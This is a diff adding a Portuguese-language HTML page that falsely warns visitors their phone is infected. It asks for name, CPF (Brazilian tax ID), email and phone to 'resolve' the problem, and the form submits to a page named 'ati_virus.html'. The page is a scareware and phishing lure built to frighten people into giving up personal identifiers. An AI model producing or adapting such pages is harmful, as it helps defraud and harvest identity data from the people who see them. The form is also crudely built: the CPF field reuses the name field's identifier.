@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Aqui tem tudo o que você procura</title>
+
+<style>
+body {
+    background-color: #111;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin-top: 10%;
+}
+
+h1 {
+    color: red;
+}
+
+form {
+    margin-top: 20px;
+}
+
+input {
+    display: block;
+    margin: 10px auto;
+    padding: 8px;
+    width: 250px;
+    border: none;
+    border-radius: 5px;
+}
+
+button {
+    padding: 10px 20px;
+    font-size: 16px;
+    background-color: red;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: darkred;
+}
+</style>
+</head>
+
+<body>
+
+<h1>⚠ Atenção! Seu celular foi infectado!</h1>
+<p>Preencha os dados para resolver o problema:</p>
+
+<form action="ati_virus.html" method="get">
+    <label for="nome">Nome</label>
+    <input type="text" name="nome" placeholder="Digite seu nome" required>
+
+    <label for="cpf">Cpf</label>
+    <input type="text" name="nome" placeholder="Digite seu cpf" required>
+
+    <label for="email">Email</label>
+    <input type="email" name="email" placeholder="Digite seu e-mail" required>
+
+    <label for="tel">Telefone</label>
+    <input type="tel" name="telefone" placeholder="Digite seu telefone" required>
+    
+    <button type="submit">Resolver Agora</button>
+
+</form>
+
+</body>
+</html>
